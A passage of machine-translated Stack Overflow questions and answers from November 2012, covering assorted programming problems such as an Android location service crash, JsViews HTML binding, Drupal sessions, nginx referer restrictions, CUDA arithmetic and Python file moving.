            String Text = "My current location is: " +"Latitud = " + loc.getLatitude() +"Longitud = " + loc.getLongitude();

            Toast.makeText( getApplicationContext(),Text,Toast.LENGTH_SHORT).show();
        //  String t=loc.getLatitude().toString();
            Cursor cr=null;
            Cursor cur=null;
            cur=y.rawQuery("SELECT longitude FROM"+ "data",null);
            cur.moveToFirst();
            cr=y.rawQuery("SELECT latitude FROM"+ "data",null);
            cr.moveToFirst();
            while(!cr.isAfterLast()) {

                arlist.add(cr.getDouble(cr.getColumnIndex("latitude")));
                cr.moveToNext();
                }
            while(!cur.isAfterLast()) {

                arrylist.add(cr.getDouble(cr.getColumnIndex("ongitude")));
                cur.moveToNext();
                }
            for(int i=0;i<arlist.size();i++){
                Location locB = new Location("point B");
                locB.setLatitude(arlist.get(i));
                locB.setLongitude(arrylist.get(i));
                float distance=loc.distanceTo(locB);
                if(distance<5){
                    Intent myIntent=new Intent(service.this,Notifier.class);
                    startActivity(myIntent);

                }
            }
            }

        }

    public void onProviderDisabled(String provider) {
        // TODO Auto-generated method stub
        Toast.makeText( getApplicationContext(),"Gps Disabled - @From :Alert Me",Toast.LENGTH_SHORT ).show();

    }

    public void onProviderEnabled(String provider) {
        // TODO Auto-generated method stub
        Toast.makeText( getApplicationContext(),"Gps Enabled - @From :Alert Me",Toast.LENGTH_SHORT).show();

    }

    public void onStatusChanged(String provider, int status, Bundle extras) {
        // TODO Auto-generated method stub

    }
    }

} 
```

当我尝试使用 Intent 访问该服务时，这是我的 logcat

```
11-11 08:22:25.867: E/AndroidRuntime(813): FATAL EXCEPTION: main
11-11 08:22:25.867: E/AndroidRuntime(813): java.lang.RuntimeException: Unable to instantiate service com.example.alert.service: java.lang.NullPointerException
11-11 08:22:25.867: E/AndroidRuntime(813):  at  android.app.ActivityThread.handleCreateService(ActivityThread.java:2347)
11-11 08:22:25.867: E/AndroidRuntime(813):  at android.app.ActivityThread.access$1600(ActivityThread.java:130)
11-11 08:22:25.867: E/AndroidRuntime(813):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1277)
11-11 08:22:25.867: E/AndroidRuntime(813):  at android.os.Handler.dispatchMessage(Handler.java:99)
11-11 08:22:25.867: E/AndroidRuntime(813):  at android.os.Looper.loop(Looper.java:137)
11-11 08:22:25.867: E/AndroidRuntime(813):  at android.app.ActivityThread.main(ActivityThread.java:4745)
11-11 08:22:25.867: E/AndroidRuntime(813):  at java.lang.reflect.Method.invokeNative(Native Method)
11-11 08:22:25.867: E/AndroidRuntime(813):  at java.lang.reflect.Method.invoke(Method.java:511)
11-11 08:22:25.867: E/AndroidRuntime(813):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
11-11 08:22:25.867: E/AndroidRuntime(813):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
11-11 08:22:25.867: E/AndroidRuntime(813):  at dalvik.system.NativeStart.main(Native Method)
11-11 08:22:25.867: E/AndroidRuntime(813): Caused by: java.lang.NullPointerException
11-11 08:22:25.867: E/AndroidRuntime(813):  at android.content.ContextWrapper.openOrCreateDatabase(ContextWrapper.java:221)
11-11 08:22:25.867: E/AndroidRuntime(813):  at android.database.sqlite.SQLiteOpenHelper.getDatabaseLocked(SQLiteOpenHelper.java:224)
11-11 08:22:25.867: E/AndroidRuntime(813):  at android.database.sqlite.SQLiteOpenHelper.getWritableDatabase(SQLiteOpenHelper.java:164)
11-11 08:22:25.867: E/AndroidRuntime(813):  at com.example.alert.service.<init>(service.java:25)
11-11 08:22:25.867: E/AndroidRuntime(813):  at java.lang.Class.newInstanceImpl(Native Method)
11-11 08:22:25.867: E/AndroidRuntime(813):  at java.lang.Class.newInstance(Class.java:1319)
11-11 08:22:25.867: E/AndroidRuntime(813):  at android.app.ActivityThread.handleCreateService(ActivityThread.java:2344) 
```

# jsrender - 如何为 JsViews 保留帮助函数生成的 HTML 标记

> ID：13328042
> 
> 赞同：2
> 
> 时间：2012-11-11T02:20:34.963
> 
> 标签：jsrender, jsviews

在 JsRender[1] 中，我有自定义标签 {{tag data /}} 来生成我的页面的一部分。根据[http://borismoore.github.com/jsrender/demos/step-by-step/03_converters-and-encoding.html](http://borismoore.github.com/jsrender/demos/step-by-step/03_converters-and-encoding.html)也可以使用 {{:value}} 从 value 呈现 HTML。

但是在 JsViews[2] 中，如果我的转换函数生成 HTML 标记（比如：

```
<div data-link="{:~conv(data)}" /> 
```

conv 在哪里生成 HTML 标签

```
function conv(data) { return '<b>' + data + '</b>'; } 
```

)，当插入 DOM 时，输出被过滤（即输出为“ **...** ”而不是粗体）。如何在 JsViews 中禁用此功能并让辅助功能为最新数据生成标记？

提前致谢！

[1] [https://github.com/BorisMoore/jsrender](https://github.com/BorisMoore/jsrender)
[2] [https://github.com/BorisMoore/jsviews](https://github.com/BorisMoore/jsviews)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T18:28:29.337

默认情况下，HTML 元素上的数据链接`div`（基本上是除表单元素之外的任何元素，如`input`or `select`）的默认目标为`innerText`，因此字符串中的 HTML 标记将呈现为标记，而不是作为 HTML 元素插入 DOM . （相当于浏览器的 HTML 编码。）

但是，您可以设置不同的目标“属性”并编写，例如，

`<div data-link="title{:~conv(data)}" />`

`title`以 的属性为目标`div`，或

`<div data-link="css-background-color{:~conv(data)}" />`

以定位背景颜色样式。

对于您的场景，您可以编写

`<div data-link="html{:~conv(data)}" />`

以`innerHTML`. 这样，您的数据或转换器或辅助输出可以作为 HTML 元素插入到 DOM 中。（当然不太安全......）。

顺便说一句，您也可以添加转换器，如：

`<div data-link="html{myCnvt:~conv(data)}" />`

回到原点，如果您使用 html 编码器作为转换器，如下所示：

`<div data-link="html{html:~conv(data)}" />`

也可以写成缩写形式：

`<div data-link="html{>~conv(data)}" />` 那么这将实际使用`innerHTML`，但会在插入之前添加 HTML 编码。

# java - 用数组制作图片

> ID：13328043
> 
> 赞同：0
> 
> 时间：2012-11-11T02:20:55.913
> 
> 标签：java, arrays, image

我正在尝试用一个充满星号的数组制作一张图片。问题是，我不知道如何让星号出现在某些坐标中。如果你能帮忙那就太好了。

```
public class Array {

    public static void main (String[] args) {
        horizontalLine();
    }

    public static void horizontalLine () {

        String [][] anArray;
        anArray = new String [2][8];

        for (int i = 0; i < 2; i ++) {

            for (int j = 2; j < 8; j ++) {
                System.out.print ("*");
                anArray [i][j] = "";
            }
        }
    }
    public static void picture () {
        horizontalLine();
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T02:33:06.337

您只需将所需符号分配给您想要的数组位置（*例如，* `anArray [i][j] = "*";`）。*用空格（例如，* `anArray [i][j] = " ";`）或其他符号填充重命名数组位置。最后，在`anArray`完全填充后，将其内容打印出来。例如：

```
String [][] anArray = new String [N][M];

for ( i = 0; i < N; i ++)
  for ( j = 0; j < M; j ++)
  {
    if(i == 0 || i == N-1 || j == 0 || j == M-1) anArray[i][j] = "*"; // Put * on the frame
    else anArray[i][j] = " "; // Put spaces inside

   }

 for ( i = 0; i < N; i ++)  //Print the picture
   for ( j = 0; j < M; j ++)
   {
       printf("%s",anArray[i][j]);
       if(j == M-1) printf("\n");
   } 
```

# c - 在 C 中：我想混合使用字符并将它们转换为小写

> ID：13328044
> 
> 赞同：1
> 
> 时间：2012-11-11T02:20:56.583
> 
> 标签：c, arrays, lowercase

为什么我的代码不接受 argv[] 字符串？我需要做什么来修复它？我希望能够同时输入小写和大写字母，并在数组中只输入小写字母。谢谢你的帮助。

```
#include <stdio.h>
#include <stdlib.h>  
#include <ctype.h>

int main(int argc, char argv[])
{

  char word[30]= atoi(argv[1]);  // here is the input
  for (int i = 0; word[i]; i++)
    word[i] = tolower(word[i]);

  printf("Here is the new word: %s\n", word);
  return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T02:37:11.590

您的代码有几个问题：

*   正如[KingsIndian](https://stackoverflow.com/a/13328049/246263)已经提到的，您在 main 函数的 argv 参数前面缺少一个 * 。这个[“主要功能”维基页面](http://en.wikipedia.org/wiki/Main_function#C_and_C.2B.2B)包含更多关于此的详细信息。

*   `atoi`用于将字符串数字转换为整数。我想这不是你想要的。`argv[x]`已经是一个字符串（char *），所以可以直接使用。

*   如果你直接使用它，你不能修改它的内容（我相信是不允许的）。因此，您需要制作副本。用于`strlen()`找出 的长度`argv[1]`，`malloc()`创建缓冲区并`strcpy()`复制它：

* * *

```
#include <stdio.h>
#include <stdlib.h>  
#include <ctype.h>
#include <string.h>

int main(int argc, char *argv[])
{
  char *word = malloc(strlen(argv[1]) + 1);
  strcpy(word, argv[1]);
  int i;
  for (i = 0; word[i]; i++)
    word[i] = tolower(word[i]);

  printf("Here is the new word: %s\n", word);
  return 0;
} 
```

补充说明：

*   如果您使用`argc`!检查给定命令行参数的数量会更好（更健壮）

*   理论上`malloc()`可以返回0，说明认领内存确实失败了。所以你应该检查一下。

*   如果您只想打印小写世界，则不需要先转换然后打印。相反，您可以直接打印每个转换后的字符。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-11T02:22:09.813

```
int main(int argc, char argv[]) 
```

应该：

```
int main(int argc, char *argv[]) 
```

此外，`strtol`是一个更好的选择，比`atoi`as`strtol`可以更好地处理故障。

# ruby-on-rails - Rails - 复杂的查询

> ID：13328047
> 
> 赞同：0
> 
> 时间：2012-11-11T02:22:02.557
> 
> 标签：ruby-on-rails, date

我是 Rails 新手，我很难使用 Rails 的方法编写查询。

我想要完成的是有一个有很多餐点的 Canteen 模型，但是我只想显示当天供应的餐点。

所以我创建了一个 Canteen 模型，即 has_many Meals。然后我创建了 Served_date 模型，该模型分为 belongs_to 餐和 Meal has_many Served_dates，这样我们就可以在提供餐点时指定多个日期。

我将如何进行这样的查询？

//PS:`Served_date.where(served_at: Date.today)`返回今天正在服务的 Served_dates

谢谢 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T02:30:42.090

首先，模型名称不应该按照惯例强调，因此您应该使用 ServedDate 而不是 Served_date。

此查询应该为您提供所需的内容：

```
Meal.joins(:served_dates).where(served_dates: {served_at: Date.today}) 
```

更好的是，您可以对其进行参数化并将其转换为更便携的范围：

```
class Meal < ActiveRecord::Base
  scope :served_on, lambda{|date| joins(:served_dates).where(served_dates: {served_at: date}) }
end 
```

然后调用：

```
Meal.served_on(Date.today) 
```

# android - 很难导入 Facebook SDK

> ID：13328059
> 
> 赞同：0
> 
> 时间：2012-11-11T02:24:30.490
> 
> 标签：android, facebook, github

![这是我的问题，因为我没有任何库项目要添加为参考](../Images/cdf9bc2efb0cc1f0ffa87fc6004579c5.png)[我在此链接https://github.com/facebook/facebook-android-sdk](https://github.com/facebook/facebook-android-sdk)中下载了 Facebook SDK并提取了它。文件夹的名称是“facebook-android-sdk-master”，我想以这种方式导入文件。

```
1.Project>import>Existing Project into Workspace> the file
2.Project>import>Archive File> the file
3.Project>import>File System> the file 
```

问题是，当我试图将它添加到我的图书馆时，没有什么可添加的。

所以我在想，也许我在 github 中下载了错误的 Facebook SDK

我下载 Facebook SDK 的方式是

我单击带有悬停文本“将此存储库下载为 zip 文件”的 ZIP 按钮

我已经阅读了很多关于此的教程，并且我只是按照他们的确切方式进行操作。

任何人都可以对这个问题有所了解吗？先谢谢了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T21:19:47.857

从这个链接：[https ://developers.facebook.com/docs/mobile/android/build/](https://developers.facebook.com/docs/mobile/android/build/)

“打开 Eclipse 并为 Facebook Android SDK 源创建一个新的 Android 项目（文件 | 新建 | 项目 | Android 项目），然后从您的应用程序中引用它。通过选择从现有源中创建项目并从您的git 存储库（~/facebook-android-sdk/facebook）。”

您可能还想查看 Android beta SDK：[https ://developers.facebook.com/android/](https://developers.facebook.com/android/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T02:26:25.840

如果您要包含 Facebook Android 源代码，则需要将其包含到您的项目中。处理此问题的另一种方法是获取 Facebook Jar 文件，然后将其添加到您的依赖项列表中。

# vb.net - VB.net HTTP post，计算进度条异步发送的字节数

> ID：13328067
> 
> 赞同：3
> 
> 时间：2012-11-11T02:26:15.713
> 
> 标签：vb.net

目前我有以下功能：

```
Private Function uploadFile(ByVal fileName As String)
    Dim data() As Byte = IO.File.ReadAllBytes(fileName)
    Dim base64String = System.Convert.ToBase64String(data)
    Dim uploadURL As String = "http://192.168.0.7/upload.php"
    Try
        Using client As New Net.WebClient
            Dim reqParm As New Specialized.NameValueCollection
            reqParm.Add("body", base64String)
            Dim responsebytes = client.UploadValues(uploadURL, "POST", reqParm)
            Dim responsebody = (New Text.UTF8Encoding).GetString(responsebytes)
        End Using
    Catch ex As System.Net.WebException
        MsgBox(ex.Message)
    Finally
            '
    End Try
End Function 
```

这会将 http 请求中的文件内容作为 base64 编码字符串发送。我想添加一个进度条，以便监控进度。使用 Java，我可以通过增加一个字节发送计数器来实现这一点，因为我一次向请求的输出流添加一个字节。我是否有与 VB.net 相同的选项，或者可能有其他选项？感谢您的任何想法

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T03:44:43.427

您可以使用`UploadValuesAsync`和收听事件处理程序`UploadProgressChanged`和`UploadValuesCompleted`.

示例代码：

```
Private Sub UploadProgressChanged(ByVal sender As Object, ByVal e As Net.UploadProgressChangedEventArgs)
    ' The progress is updated
    ProgressBar1.Value = e.ProgressPercentage
End Sub

Private Sub UploadValuesCompleted(ByVal sender As Object, ByVal e As Net.UploadValuesCompletedEventArgs)
    Dim responsebytes = e.Result
    Dim responsebody = (New System.Text.UTF8Encoding).GetString(responsebytes)
    ' Do whatever you want
    MsgBox(responsebody)
End Sub

Private Function uploadFile(ByVal fileName As String) As Boolean
    Dim data() As Byte = IO.File.ReadAllBytes(fileName)
    Dim base64String = System.Convert.ToBase64String(data)
    Dim uploadURL As String = "http://192.168.0.7/upload.php"
    Try
        Using client As New Net.WebClient
            Dim reqParm As New Specialized.NameValueCollection
            reqParm.Add("body", base64String)
            AddHandler client.UploadProgressChanged, AddressOf UploadProgressChanged
            AddHandler client.UploadValuesCompleted, AddressOf UploadValuesCompleted
            client.UploadValuesAsync(New System.Uri(uploadURL), "POST", reqParm)
        End Using
    Catch ex As System.Net.WebException
        MsgBox(ex.Message)
    Finally
        '
    End Try
    Return True
End Function 
```

# forms - 自动将电子邮件地址从表单添加到联系人组

> ID：13328073
> 
> 赞同：5
> 
> 时间：2012-11-11T02:26:51.823
> 
> 标签：forms, email, google-drive-api, google-contacts-api

我负责即将举行的学生会议，并在 Google Drive 上创建了一个注册表单，其中一个“问题”是注册人的电子邮件地址。在 Google 云端硬盘中，所有电子邮件地址都整理在一列中。

有没有办法自动将这列电子邮件地址同步到指定的联系人组，以便在组中更新每个其他注册人的电子邮件地址？这将有助于我在会议更新时回复他们。

非常感谢您的帮助 ：）

# php - 从外部页面访问 Drupal $_SESSION 变量时遇到问题

> ID：13328074
> 
> 赞同：1
> 
> 时间：2012-11-11T02:27:11.580
> 
> 标签：php, session, drupal, drupal-7, session-variables

我无法访问外部页面上的 $_SESSION 变量。

基本上，我在一个drupal节点上有一个表单，当提交时，它会发布到一个外部php文件，该文件将值保存到一个$_SESSION变量，如下所示：

```
//Bootstrap Drupal so we can use the SESSION variables, where we store the calling number for the
//duration of the logged in session
define('DRUPAL_ROOT', $_SERVER['DOCUMENT_ROOT']);
$base_url = 'http://'.$_SERVER['HTTP_HOST'];
require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_SESSION);

//Save number as the calling number for the session
$_SESSION['calling-number']=$_REQUEST['calling-number']; 
```

这很好用。

当我稍后尝试使用以下方法从外部页面访问 $_SESSION 变量时：

```
//Bootstrap Drupal so we can use the SESSION variables, where we store the calling number for the
//duration of the logged in session
define('DRUPAL_ROOT', $_SERVER['DOCUMENT_ROOT']);
$base_url = 'http://'.$_SERVER['HTTP_HOST'];
require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_SESSION);

echo $_SESSION['calling-number']; 
```

我什么都得不到。如果我查看这个新页面上的 $user，我可以看到这是因为它在匿名用户会话 (uid = 0) 下运行，而不是设置 $_SESSION 变量的登录用户 ID，因此它找不到。

任何想法为什么我不使用登录用户的会话？

编辑

不知道为什么会这样，但是只要两个外部文件位于不同的目录中，就可以正常工作。如果它们在同一目录中，则似乎开始了一个新会话而不访问现有会话。不知道为什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T17:15:27.663

如果我理解正确，您将来自 Drupal 的表单（其中有经过身份验证的用户）提交到外部 PHP 文件。当您尝试从引导 Drupal 的外部页面访问会话时，会话不包含先前保存的值，并且用户被报告为匿名用户，而不是先前提交表单的经过身份验证的用户。

这通常发生，因为：

*   Drupal 找不到名称为`session_name()`和的 cookie `substr(session_name(), 1)`。
    在这种情况下，[drupal_session_initialize()](http://api.drupal.org/api/drupal/includes!session.inc/function/drupal_session_initialize/7)执行以下代码。

    ```
    // Set a session identifier for this request. This is necessary because
    // we lazily start sessions at the end of this request, and some
    // processes (like drupal_get_token()) needs to know the future
    // session ID in advance.

    $GLOBALS['lazy_session'] = TRUE;
    $user = drupal_anonymous_user();
    // Less random sessions (which are much faster to generate) are used for
    // anonymous users than are generated in drupal_session_regenerate() when
    // a user becomes authenticated.
    session_id(drupal_hash_base64(uniqid(mt_rand(), TRUE)));
    if ($is_https && variable_get('https', FALSE)) {
      $insecure_session_name = substr(session_name(), 1);
      $session_id = drupal_hash_base64(uniqid(mt_rand(), TRUE));
      $_COOKIE[$insecure_session_name] = $session_id;
    } 
    ```

*   Drupal 在其会话数据库表中找不到与`$sid`传递给其会话读取回调（[_drupal_session_read()](http://api.drupal.org/api/drupal/includes!session.inc/function/_drupal_session_read/7)）的参数值相等的 sid（或 ssid）的记录。如果会话已过期，也可能发生这种情况。

    ```
    if ($is_https) {
      $user = db_query("SELECT u.*, s.* FROM {users} u INNER JOIN {sessions} s ON u.uid = s.uid WHERE s.ssid = :ssid", array(':ssid' => $sid))->fetchObject();
      if (!$user) {
        if (isset($_COOKIE[$insecure_session_name])) {
          $user = db_query("SELECT u.*, s.* FROM {users} u INNER JOIN {sessions} s ON u.uid = s.uid WHERE s.sid = :sid AND s.uid = 0", array(
            ':sid' => $_COOKIE[$insecure_session_name],
          ))
          ->fetchObject();
        }
      }
    }
    else {
      $user = db_query("SELECT u.*, s.* FROM {users} u INNER JOIN {sessions} s ON u.uid = s.uid WHERE s.sid = :sid", array(':sid' => $sid))->fetchObject();
    } 
    ```

[当 PHP 关闭时，Drupal 总是通过_drupal_session_write()](http://api.drupal.org/api/drupal/includes!session.inc/function/_drupal_session_write/7)为当前用户保存会话。当当前用户是匿名用户时也会这样做。

```
 if (!drupal_save_session()) {
      // We don't have anything to do if we are not allowed to save the session.
      return;
    }

    // Check whether $_SESSION has been changed in this request.
    $last_read = &drupal_static('drupal_session_last_read');
    $is_changed = !isset($last_read) || $last_read['sid'] != $sid || $last_read['value'] !== $value;

    // For performance reasons, do not update the sessions table, unless
    // $_SESSION has changed or more than 180 has passed since the last update.
    if ($is_changed || !isset($user->timestamp) || REQUEST_TIME - $user->timestamp > variable_get('session_write_interval', 180)) {
      // Either ssid or sid or both will be added from $key below.
      $fields = array(
        'uid' => $user->uid, 
        'cache' => isset($user->cache) ? $user->cache : 0, 
        'hostname' => ip_address(), 
        'session' => $value, 
        'timestamp' => REQUEST_TIME,
      );

      // Use the session ID as 'sid' and an empty string as 'ssid' by default.
      // _drupal_session_read() does not allow empty strings so that's a safe
      // default.
      $key = array(
        'sid' => $sid,
        'ssid' => '',
      );

      // ...

      db_merge('sessions')
        ->key($key)
        ->fields($fields)
        ->execute();
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-22T20:42:39.763

对于那些在使用外部页面时遇到同样问题的人：

您只需在代码中添加更多参数

事实上，你必须精确你的 drupal 目录。

前任。对于您的 drupal 目录之前的目录中的页面

```
// Definine the path to "DRUPAL_ROOT" which is used throughout bootstrap.inc

define('DRUPAL_ROOT', getcwd() . '/your_drupal_directory');

// you could write like this too

// define('DRUPAL_ROOT', $_SERVER['DOCUMENT_ROOT'] . '/your_drupal_directory');

// Define the $base_url which will be used by Drupal to make sure we are on the same domain

$base_url = 'http://'.$_SERVER['HTTP_HOST']. '/your_drupal_directory';

require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_SESSION);

echo $_SESSION['calling-number']; 
```

# azure - Azure 存储模拟器上的新 $Metrics 表是什么？

> ID：13328076
> 
> 赞同：1
> 
> 时间：2012-11-11T02:27:22.657
> 
> 标签：azure, azure-storage, azure-table-storage

我在我的 Azure 存储模拟器上注意到以下表格：

```
$MetricsCapacityBlob
$MetricsTransactionBlob
$MetricsTransactionsQueue
$MetricsTransactionsTable 
```

在我的生产环境中：

```
WADDiagnosticInfrastructureTable
WADDirectoriesTable
WADPerformanceCountersTable
WADWindowsEventLogsTable 
```

有人可以解释我是否需要这些表，以及为什么模拟器和生产中有不同的表？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:25:25.430

这些是包含指标数据的存储分析表 ( [http://msdn.microsoft.com/en-us/library/windowsazure/hh343258.aspx](http://msdn.microsoft.com/en-us/library/windowsazure/hh343258.aspx) )。它们包含有关如何访问存储及其性能的数据。我不确定为什么它们会出现在您的开发存储帐户中，但要让它们出现在您的生产存储帐户中，您需要在您的存储帐户上显式启用存储分析。

希望这可以帮助。

# mongodb - 使用 mongoDB 构建工作时间的最佳方法是什么？

> ID：13328078
> 
> 赞同：1
> 
> 时间：2012-11-11T02:27:43.170
> 
> 标签：mongodb, mongoid

我目前提出了一个可能的解决方案，用于在我正在构建的应用程序中为企业存储营业时间。基本上最多有 7 个项目代表一周中的某一天，每个项目将有 3 个字段 - `integer to represent the day of the week (integer)`、`open time (datetime)`、`close time (datetime)`。在`Business`模型中，我应该只创建一个数组字段来存储这 7 个数组，还是应该为此创建一个嵌入式文档对象并创建`embeds_many`关系？

# php - 只允许我的服务器在 PHP 中执行脚本

> ID：13328079
> 
> 赞同：0
> 
> 时间：2012-11-11T02:27:44.470
> 
> 标签：php, security, nginx, xss, csrf

防止`PHP`从其他主机执行脚本的最佳方法是什么？基本上，我只希望我的服务器`web1.mydomain.com`执行 PHP 脚本。现在，如果我创建一个带有`iframe`or的 html 文件，该文件`img tag`指向我在不同域上的脚本并调用它，它就会工作并执行。我想防止这种情况。

是否可以在 Web 服务器级别而不是 PHP 应用程序代码中执行此操作？我正在使用`nginx`. 那将是最好的解决方案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T02:37:54.203

为了防止页面嵌入到您域之外的框架中，您可以设置`X-Frame-Options`响应标头以防止来自其他域的页面将其嵌入到 iframe 中（只要浏览器服从）。

在 nginx 中，您可以将其添加到配置中：

```
add_header X-Frame-Options SAMEORIGIN; 
```

对于阿帕奇：

```
Header always append X-Frame-Options SAMEORIGIN 
```

[https://developer.mozilla.org/en-US/docs/The_X-FRAME-OPTIONS_response_header](https://developer.mozilla.org/en-US/docs/The_X-FRAME-OPTIONS_response_header)

* * *

对于`<img>`标签，您可以检查`$_SERVER['HTTP_REFERER']`.

```
if(isset($_SERVER['HTTP_REFERER'])){
    if(preg_match("@^http://web1.mydomain.com($|/.*)@", $_SERVER['HTTP_REFERER']) != 1){
        die;
    }
} 
```

此方法依赖于`HTTP_REFERER`用户代理设置的。我认为这应该适用于大多数情况。不幸的是，我没有办法测试。

我认为这也阻止了 AJAX？...

实际上它还阻止用户使用`<a>`标签链接到您的网页，所以我不会说这是一个非常好的...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T08:41:52.243

这似乎是`valid_referers`nginx 指令用途的教科书案例。

将类似以下内容添加到`location`脚本的 -block 中：

```
valid_referers web1.mydomain.com; 
```

或者，如果您想不那么严格，并且更容忍剥离/混淆的引用：

```
valid_referers none blocked web1.mydomain.com; 
```

有关更多信息，请参阅[http://nginx.org/en/docs/http/ngx_http_referer_module.html#valid_referers](http://nginx.org/en/docs/http/ngx_http_referer_module.html#valid_referers)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T02:35:54.097

如果您有权访问您的 apache 配置文件，则可以执行以下操作：

```
Order Deny,Allow
Deny from all
Allow from 127.0.0.1 
```

之后您可能需要添加以下内容：

```
<FilesMatch "*\.(css|js|gif|jpg|png)$">
  Order Allow,Deny
  Allow from all
</FilesMatch> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-11T02:36:42.897

您可以使用 nginx 主机配置来完成。将以下代码放入所有主机`server`块中，除了您要允许执行的块。

```
 location /myscript {
    deny all;
  } 
```

# c++ - 在 CUDA 上乘以两个浮点变量

> ID：13328080
> 
> 赞同：4
> 
> 时间：2012-11-11T02:27:53.293
> 
> 标签：c++, c, cuda, gpu, multiplication

我有一个非常有趣的问题，但我解决了 3 个小时，但我无法弄清楚发生了什么以及为什么它不起作用。我试过谷歌它，但没有结果。

我在 CUDA 上编写程序。我有这段非常简单的代码：

```
__global__ void calcErrorOutputLayer_kernel(*arguments...*)
{

   int idx = blockIdx.x * blockDim.x + threadIdx.x;
   float gradient;
   float derivation;
   derivation = pow((2/(pow(euler, neuron_device[startIndex + idx].outputValue) +
                pow(euler, -neuron_device[startIndex + idx].outputValue))), 2);
   gradient = (backVector_device[idx] - neuron_device[startIndex + idx].outputValue);

   gradient = gradient * derivation;   //this line doesn't work   
   gradient = gradient * 2.0;          //this line works 
```

好的，所以梯度计算正确并且推导也正确。但是当上线时，这两个变量应该在哪里相乘什么都没有发生（梯度的值没有改变）并且在下一行 CUDA 调试器告诉我：“'派生'在目标位置没有价值”

gradient * 2.0 正常工作，它改变了梯度值 2 次。

任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T03:30:07.993

```
a = pow(euler, neuron_device[startIndex + idx].outputValue);
b = pow(euler, -neuron_device[startIndex + idx].outputValue);
derivation = pow((2/(a + b),2); 
```

Pow 在以下情况下会出错：

*   底数为**负**且**指数不是整数值**，或
*   **基数为零**，指数为**负**，发生域错误，将全局变量 errno 设置为值 EDOM。

我猜您正面临精度问题，并且`'a'`两者`'b'`都是`0`. 您可能正在获取`derivation = 0`或`"inf"`。

你能把花车改成双打吗？

# python - PYTHON：从数组中搜索文件名，然后重新定位文件

> ID：13328087
> 
> 赞同：1
> 
> 时间：2012-11-11T02:29:37.320
> 
> 标签：python, sorting

我是 Python 新手，真的可以使用一些帮助。我有大量正在分类的图像。我需要每 260 张图像（例如：0、260、520、780 等）。然后我需要将这些图像重新定位到一个新文件夹。到目前为止，这是我的代码：

```
import os, os.path, sys, shutil
root = '.'
dst = "/Users/Desktop"

print "/////// F I N D__A L L__F I L E S __W I T H I N __R A N G E ///////////////////"

selectPhotos = range(260, 213921)
print selectPhotos[::260]

print "/////// L I S T__O F __A L L __J P E G S ///////////////////"

for files in os.listdir("/Users/Desktop/spaceOddy/"):
   #if files.endswith(".jpg"):
     # print files

   if files.startswith(selectPhotos[]):
      print files

      shutil.move ("files", root) 
```

我的代码不能在两个地方工作。

1.  我收到一个错误，我需要将一个元组传递给startswith，我不知道该怎么做。我知道元组是什么，但就语法而言，我一无所知。

2.  我不太了解shutil.move。如果有人知道更好的方法，我将不胜感激。

谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T03:40:54.190

要将目录中的每个第 n 个图像文件移动到另一个目录：

```
#!/usr/bin/env python
from __future__ import print_function
import glob
import shutil
import sys

dstdir = "/Users/Desktop"
for file in glob.glob("/Users/Desktop/spaceOddy/*.jpg")[::260]:
    try:
        shutil.move(file, dstdir)
    except EnvironmentError as e:
        print("can't move {}, error {}".format(file, e), file=sys.stderr) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:36:40.847

从这里开始。

```
import os, shutil
root = '.'
src = "/Users/Desktop/spaceOddy/"
dst = "/Users/Desktop"

for i, filename in enumerate(os.listdir(src)):

    if i%260 == 0:
      print filename
      shutil.move (src + filename, root) 
```

*   我已更改`files`为`filename`. 在循环内部，`filename`是一个字符串：目录中单个文件的名称。

*   我使用`enumerate`，它为我们提供了文件名和从 0 开始的计数器。尝试`print enumerate(['cat', 'dog', 'pig'])`在 shell 中执行类似操作以查看它的作用。

*   现在我们有了一个计数器，我使用测试 i%260 == 0 只选择第 260 个文件。

*   如果您需要获取每 260 个 .jpg 文件，请将 if 语句更改为`if i%260==0 and filename.endswith('.jpg')`

*   我不知道你想用它做什么`startswith`，但如果你想使用它，你需要传递一个字符串作为参数，*而不是*一个元组。

*   `print selectPhotos[::260]`实际上并没有改变 selectPhotos。在这种情况下您可能实际上并不需要它，但对于将来......您可以传递一个 step 值来`range`喜欢这个`selectPhotos = range(0,213921,260)`或在创建它后更改 selectPhotos，使用`selectPhotos = selectPhotos[::260]`

# javascript - 使用确认（）表单打开新选项卡或窗口

> ID：13328088
> 
> 赞同：1
> 
> 时间：2012-11-11T02:29:46.037
> 
> 标签：javascript, jquery, webkit, opera, window.open

我尝试在新选项卡或窗口中打开一些 URL，但任何基于 Webkit 的浏览器或 Opera 都会阻止它们。我尝试了许多变体来做到这一点，就像`window.open()`这样：

```
if(c<q){var l='url';
var g=$('<form action="'+l+'" style="display:none;" target="_blank"></form>')
.appendTo('.append').eq(0);
if(confirm('some text')){g[0].submit();}} 
```

但任何结果...... - 此代码不仅在 Firefox 上被阻止。如何创建合适的？谢谢你的帮助！

* * *

## 回答 #1

> 赞同：3
> 
